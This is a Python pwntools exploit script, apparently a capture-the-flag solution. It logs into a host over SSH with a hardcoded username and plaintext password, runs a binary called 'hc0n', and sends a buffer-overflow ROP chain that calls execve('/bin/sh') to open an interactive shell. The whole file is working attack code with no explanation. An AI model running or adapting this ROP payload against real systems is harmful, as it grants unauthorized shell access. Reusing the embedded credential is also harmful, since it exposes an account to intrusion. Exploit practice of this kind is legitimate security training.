#!/usr/bin/env python3
from pwn import *

HOST='10.64.172.68'
PORT=22

def ROP(sess):
	# gadgets
	pop_rax   = p64(0x000000000040061f)
	pop_rdi   = p64(0x0000000000400604)
	pop_rsi   = p64(0x000000000040060d)
	pop_rdx   = p64(0x0000000000400616)
	bin_sh    = p64(0x00000000004006f8)
	syscall   = p64(0x00000000004005fa)

	buf = b'a'*56
	# set 'rdi' to '/bin/sh' address pointer
	buf += pop_rdi
	buf += bin_sh

	# set rax to '0x3b' (execve syscall id)
	buf += pop_rax
	buf += p64(0x3b)


	# set 'rsi' to 0 
	buf += pop_rsi
	buf += p64(0)

	# set 'rdx' to 0
	buf += pop_rdx
	buf += p64(0)

	# syscall
	buf += syscall

	# execve("/bin/sh",0,0)

	print(sess.recvline()) # print first string
	sess.sendline(buf) # send payload
	sess.interactive() 

r = ssh(host=HOST, port=PORT, user="thedarktangent", password="Gf7MRr55n$@#PDuliL")
sess = r.run('~/hc0n')

ROP(sess)
